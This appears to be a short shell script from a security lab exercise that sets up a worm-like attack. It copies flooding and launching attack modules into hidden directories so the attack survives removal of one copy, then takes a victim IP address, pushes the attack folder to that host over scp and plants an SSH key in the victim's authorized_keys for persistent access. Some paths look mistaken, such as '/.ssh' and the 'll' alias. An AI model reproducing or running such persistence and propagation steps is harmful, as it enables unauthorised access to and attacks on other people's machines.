# task2
# replication attack file to two hidden files
Hidden1="../../.etc/.qq"
mkdir $Hidden1
cp ./Infect/Flooding_Attack $Hidden1
cp ./Infect/Check_Attack $Hidden1
cp ./Infect/Launching_Attack $Hidden1

Hidden2="../../.Launch_Attack"
mkdir $Hidden2
cp ./Infect/Launching_Attack $Hidden2

# When one of attack modules is removed, the attack can still be launched by the other

# trigger automatically every 1 minute, if it is not running


# task3
# input victim's IP address
read -p "Enter Victim IP Address: " IP_Address
scp -r ./Infect victim@"$IP_Address":/home/victim/Desktop/

# publickey
ssh-keygen
scp /.ssh/id_rsa.pub victim@"$IP_Address":/.ssh/
ssh victim@"$IP_Address"
cat /.ssh/id_rsa.pub >> /.ssh/authorized_keys
chmod 700 /.ssh/
chmod 644 /.ssh/authorized_keys 
ll -d /.ssh 
ll /.ssh/authorized_keys 
exit
ssh victim@"$IP_Address"